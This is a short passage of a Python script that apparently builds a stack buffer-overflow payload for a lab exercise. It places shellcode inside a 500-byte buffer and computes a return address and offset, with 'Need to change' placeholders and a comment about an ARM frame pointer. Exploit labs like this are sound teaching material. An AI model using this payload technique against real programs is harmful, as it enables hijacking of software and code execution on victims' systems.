...
start = 500 - len(shellcode)              # Need to change
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = (0x0000fffffffff630 + 1000 + 320) # x29 inside foo + 100 dymu buffer + 230 to jump to the ~middles of str in main 
offset = 88              # Need to change
